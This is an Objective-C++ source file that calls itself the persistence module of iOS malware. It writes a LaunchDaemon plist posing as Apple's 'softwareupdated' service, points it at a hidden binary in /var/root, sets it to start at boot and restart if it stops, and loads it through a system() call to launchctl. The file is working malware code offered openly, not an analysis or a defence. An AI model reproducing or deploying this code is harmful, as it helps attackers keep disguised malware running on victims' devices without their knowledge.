// ============================================================================
// FILE: persistence.mm
// MODULE: Persistence (Surviving Reboots)
// ============================================================================

#import <Foundation/Foundation.h>
#include <iostream>
#include <string>

namespace PersistenceModule {

    class Anchor {
    public:
        // This function is called at the end of main.mm to ensure the malware survives a reboot.
        bool establish_persistence() {
            std::cout << "[PERSISTENCE] Setting up LaunchDaemon for persistence...\n";

            // 1. The path where the malware binary is currently running from
            // In a real attack, you would copy the binary to a hidden location first (e.g., /var/root/.sysd)
            NSString *malwarePath = @"/var/root/.sysd"; 

            // 2. The path to the LaunchDaemon directory (Requires Root)
            NSString *plistPath = @"/Library/LaunchDaemons/com.apple.softwareupdated.plist";

            // 3. Create the plist dictionary
            NSMutableDictionary *plistDict = [[NSMutableDictionary alloc] init];
            
            // The unique identifier for the daemon
            [plistDict setObject:@"com.apple.softwareupdated" forKey:@"Label"];
            
            // The executable to run
            [plistDict setObject:@[malwarePath] forKey:@"ProgramArguments"];
            
            // Start the daemon as soon as the phone boots (RunAtLoad)
            [plistDict setObject:[NSNumber numberWithBool:YES] forKey:@"RunAtLoad"];
            
            // Keep the daemon alive even if it crashes (KeepAlive)
            [plistDict setObject:[NSNumber numberWithBool:YES] forKey:@"KeepAlive"];
            
            // Disable environment variables (stealth)
            [plistDict setObject:[NSNumber numberWithBool:YES] forKey:@"DisableEnvironmentVariables"];

            // 4. Write the plist file to the disk
            BOOL success = [plistDict writeToFile:plistPath atomically:YES];
            
            if (success) {
                std::cout << "[PERSISTENCE] Successfully wrote LaunchDaemon to " << [plistPath UTF8String] << "\n";
                
                // 5. Set the correct permissions (Root read/write, everyone else read)
                // This ensures iOS accepts the plist.
                [[NSFileManager defaultManager] setAttributes:@{NSFilePosixPermissions: @0644} ofItemAtPath:plistPath error:nil];
                
                // 6. Load the daemon immediately without rebooting
                // (Simulated command execution)
                std::string loadCmd = "launchctl load " + std::string([plistPath UTF8String]);
                system(loadCmd.c_str());
                
                return true;
            } else {
                std::cout << "[PERSISTENCE-ERR] Failed to write LaunchDaemon. Root access likely denied.\n";
                return false;
            }
        }
    };
}